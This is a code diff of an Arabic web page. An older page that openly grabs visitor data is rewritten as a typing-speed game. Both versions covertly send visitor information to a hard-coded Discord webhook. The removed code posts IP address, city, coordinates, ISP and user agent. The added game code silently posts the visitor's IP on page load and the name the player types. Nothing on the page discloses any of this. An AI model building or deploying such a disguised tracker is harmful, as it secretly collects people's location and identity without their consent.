@@ -1,120 +1,346 @@
-بذا <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>تعيش و تاكل غيرها</title>
+  <title>اختبر سرعتك</title>
   <style>
     body {
-      margin: 0; padding: 0;
-      background: url('https://i.pinimg.com/736x/bb/e2/80/bbe2806d8273a49096437c6ce79fb361.jpg') no-repeat center center fixed;
-      background-size: cover;
-      font-family: 'Courier New', Courier, monospace;
-      color: #000;
+      font-family: Tahoma, sans-serif;
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      min-height: 100vh;
+      background: black;
+      overflow: hidden;
+      color: white;
+    }
+
+    canvas#stars {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 60px auto;
+      padding: 20px;
+      background: rgba(20, 20, 20, 0.9);
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
+    }
+
+    input[type="text"] {
+      padding: 12px;
+      font-size: 18px;
+      width: 80%;
+      margin-bottom: 15px;
+      border: 2px solid #555;
+      border-radius: 8px;
+      background: #111;
+      color: white;
+    }
+
+    button {
+      padding: 12px 25px;
+      font-size: 18px;
+      background-color: #6a1b9a;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 5px;
+    }
+
+    #sentence {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 25px 0;
+    }
+
+    #record, #musicControl, #rightsButton {
+      position: fixed;
+      z-index: 10;
+    }
+
+    #record {
+      right: 20px;
+      top: 20px;
+      background: #222;
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      border: 1px solid #555;
+    }
+
+    #musicControl {
+      left: 20px;
+      top: 20px;
+      background: #333;
+      color: white;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      cursor: pointer;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      text-align: center;
+      font-size: 20px;
+      user-select: none;
     }
-    .media-container {
-      width: 750px;
-      border: 2px solid #000;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0, 0, 255, 0.7);
-      overflow: hidden;
-      margin-bottom: 20px;
+
+    #rightsButton {
+      top: 20px;
+      right: 70px;
+      width: 40px;
+      height: 40px;
+      background: transparent;
+      cursor: pointer;
     }
-    video {
+
+    #rightsButton img {
       width: 100%;
-      height: auto;
-      display: block;
+      height: 100%;
     }
-    audio {
-      width: 100%;
-      outline: none;
-    }
-    .info {
-      margin-top: 10px;
-      font-size: 1.2em;
-      color: #000;
-      text-shadow: 0 0 8px #00f, 0 0 15px #00f, 0 0 25px #00f;
-      letter-spacing: 2px;
-      background: rgba(255, 255, 255, 0.7);
+
+    #rightsMenu {
+      display: none;
+      position: fixed;
+      top: 70px;
+      right: 20px;
+      background: #111;
+      color: white;
+      border-radius: 8px;
       padding: 15px;
-      border-radius: 10px;
-      max-width: 750px;
-      white-space: pre-wrap;
-      text-align: left;
-      line-height: 1.4;
-      direction: rtl;
+      font-size: 14px;
+      z-index: 1000;
+      width: 220px;
+      box-shadow: 0 0 10px rgba(255,255,255,0.3);
+    }
+
+    #rightsMenu div {
+      margin-bottom: 10px;
+    }
+
+    #closeBtn {
+      background: #c62828;
+      border: none;
+      border-radius: 5px;
+      padding: 6px 12px;
+      color: white;
+      cursor: pointer;
+      float: left;
+    }
+
+    #result.error {
+      color: #f44336;
     }
   </style>
 </head>
 <body>
 
-  <div class="media-container">
-    <video autoplay loop muted playsinline>
-      <source src="https://k.top4top.io/m_3409gpb551.mp4" type="video/mp4" />
-      المتصفح لا يدعم الفيديو
-    </video>
-    <audio autoplay loop>
-      <source src="https://h.top4top.io/m_3409mxajn1.mp3" type="audio/mpeg" />
-      متصفحك لا يدعم تشغيل الصوت.
-    </audio>
-  </div>
+<canvas id="stars"></canvas>
 
-  <div class="info" id="info">جاري تحميل المعلومات...</div>
+<div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
+<div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>
 
-  <script>
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
+<button id="rightsButton" title="حقوق المطور">
+  <img src="https://cdn.iconscout.com/icon/free/png-256/discord-3-569463.png" alt="Discord Logo" />
+</button>
 
-    async function fetchInfo() {
-      try {
-        const ipResponse = await fetch('https://ipinfo.io/json?token=431b829fd37a91');
-        const ipData = await ipResponse.json();
+<div id="rightsMenu">
+  <button id="closeBtn">إغلاق</button>
+  <div>المطور: <b>MOTH</b></div>
+  <div>Discord: <b>moth.codes</b></div>
+</div>
 
-        const ua = navigator.userAgent;
-        const lang = navigator.language;
+<div class="container" id="loginScreen">
+  <h2>مرحبًا!</h2>
+  <p>اكتب اسمك وابدأ</p>
+  <input type="text" id="playerName" placeholder="اسمك" />
+  <br />
+  <button onclick="startGame()">ابدأ</button>
+</div>
 
-        const now = new Date();
-        const timeString = `${now.getFullYear()}/${String(now.getMonth() + 1).padStart(2, '0')}/${String(now.getDate()).padStart(2, '0')} ` +
-          `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+<div class="container" id="gameScreen" style="display:none;">
+  <h2 id="welcomeMsg"></h2>
+  <div id="sentence">...</div>
+  <input type="text" id="userInput" placeholder="اكتب هنا" onkeydown="handleEnter(event)" />
+  <br />
+  <button onclick="checkInput()">تحقق</button>
+  <div id="speedDisplay"></div>
+  <div id="bestTime"></div>
+  <div id="result"></div>
+</div>
 
-        let ipv4 = ipData.ip.includes(':') ? 'غير معروف (IPv6 فقط)' : ipData.ip;
-        let ipv6 = ipData.ip.includes(':') ? ipData.ip : 'غير معروف';
+<audio id="bgMusic" src="https://files.catbox.moe/l0gz7g.mp3" loop></audio>
 
-        const infoText = 
-`@here
-IP (IPv4): ${ipv4}
-IP (IPv6): ${ipv6}
-City: ${ipData.city}
-Region: ${ipData.region}
-Country: ${ipData.country}
-Location: ${ipData.loc}
-Organization: ${ipData.org}
-Timezone: ${ipData.timezone}
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w';
+const starsCanvas = document.getElementById("stars");
+const ctx = starsCanvas.getContext("2d");
+let stars = [];
 
-User Agent: ${ua}
-Language: ${lang}
-Time: ${timeString}`;
+function resizeCanvas() {
+  starsCanvas.width = window.innerWidth;
+  starsCanvas.height = window.innerHeight;
+}
+window.addEventListener("resize", resizeCanvas);
+resizeCanvas();
 
-        document.getElementById('info').textContent = infoText;
+function initStars(count) {
+  stars = [];
+  for (let i = 0; i < count; i++) {
+    stars.push({
+      x: Math.random() * starsCanvas.width,
+      y: Math.random() * starsCanvas.height,
+      r: Math.random() * 2,
+      dx: Math.random() * 0.7,
+      dy: Math.random() * 0.7
+    });
+  }
+}
 
-        await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: infoText })
-        });
+function drawStars() {
+  ctx.clearRect(0, 0, starsCanvas.width, starsCanvas.height);
+  ctx.fillStyle = "white";
+  stars.forEach(star => {
+    ctx.beginPath();
+    ctx.arc(star.x, star.y, star.r, 0, 2 * Math.PI);
+    ctx.fill();
+    star.x += star.dx;
+    star.y += star.dy;
+    if (star.x > starsCanvas.width) star.x = 0;
+    if (star.y > starsCanvas.height) star.y = 0;
+  });
+  requestAnimationFrame(drawStars);
+}
+initStars(250);
+drawStars();
 
-      } catch (e) {
-        document.getElementById('info').textContent = 'فشل تحميل المعلومات';
-      }
+const rightsBtn = document.getElementById("rightsButton");
+const rightsMenu = document.getElementById("rightsMenu");
+const closeBtn = document.getElementById("closeBtn");
+
+rightsBtn.addEventListener("click", (e) => {
+  rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
+  e.stopPropagation();
+});
+closeBtn.addEventListener("click", () => rightsMenu.style.display = "none");
+document.addEventListener("click", (e) => {
+  if (!rightsMenu.contains(e.target) && !rightsBtn.contains(e.target)) {
+    rightsMenu.style.display = "none";
+  }
+});
+
+let currentSentence = "";
+let startTime = 0;
+let highestSpeed = 0;
+let bestTime = null;
+const sentences = ["ابدأ الآن", "سر النجاح الاستمرار", "لا تستسلم", "ركز جيداً"];
+
+const loginScreen = document.getElementById("loginScreen");
+const gameScreen = document.getElementById("gameScreen");
+const playerName = document.getElementById("playerName");
+const welcomeMsg = document.getElementById("welcomeMsg");
+const sentence = document.getElementById("sentence");
+const userInput = document.getElementById("userInput");
+const result = document.getElementById("result");
+const record = document.getElementById("record");
+const speedDisplay = document.getElementById("speedDisplay");
+const bestTimeDisplay = document.getElementById("bestTime");
+const music = document.getElementById("bgMusic");
+const musicControl = document.getElementById("musicControl");
+
+function startGame() {
+  const name = playerName.value.trim();
+  if (!name) return alert("اكتب اسمك أولاً");
+  welcomeMsg.textContent = `هيا يا ${name}`;
+  loginScreen.style.display = "none";
+  gameScreen.style.display = "block";
+  record.style.display = "block";
+  music.volume = 0.2;
+  music.play().catch(() => {
+    musicControl.textContent = "🔇";
+  });
+  nextSentence();
+  sendUserName(name);
+}
+
+function nextSentence() {
+  currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
+  sentence.textContent = currentSentence;
+  userInput.value = "";
+  result.textContent = "";
+  result.classList.remove("error");
+  speedDisplay.textContent = "";
+  bestTimeDisplay.textContent = "";
+  startTime = Date.now();
+  userInput.focus();
+}
+
+function handleEnter(e) {
+  if (e.key === "Enter") checkInput();
+}
+
+function checkInput() {
+  const typed = userInput.value.trim();
+  const duration = (Date.now() - startTime) / 1000;
+  const speed = Math.round((typed.length / duration) * 60);
+
+  if (typed === currentSentence) {
+    result.textContent = "تمام!";
+    if (speed > highestSpeed) {
+      highestSpeed = speed;
+      bestTime = duration;
+      record.textContent = `أعلى سرعة: ${highestSpeed} - ${bestTime.toFixed(2)} ثانية`;
     }
+    speedDisplay.textContent = `سرعتك: ${speed}`;
+    bestTimeDisplay.textContent = `الوقت: ${duration.toFixed(2)} ثانية`;
+    setTimeout(nextSentence, 800);
+  } else {
+    result.textContent = "خطأ! أعد المحاولة";
+    result.classList.add("error");
+    speedDisplay.textContent = `سرعتك: ${speed}`;
+  }
+}
 
-    fetchInfo();
-  لا ذي المعلومات الي كذا الي بذا سكربت + ضيف لو سجل اسمه تجي رساله جديدة اخرى فيها اسمه + </script>
+musicControl.addEventListener("click", () => {
+  if (music.paused) {
+    music.play();
+    musicControl.textContent = "🎵";
+  } else {
+    music.pause();
+    musicControl.textContent = "🔇";
+  }
+});
+
+function sendUserName(name) {
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content: `اسم اللاعب: ${name}` })
+  });
+}
+
+window.onload = () => {
+  fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: `IP: ${data.ip}` })
+      });
+    });
+};
+</script>
 
 </body>
-</ html>
+</html>
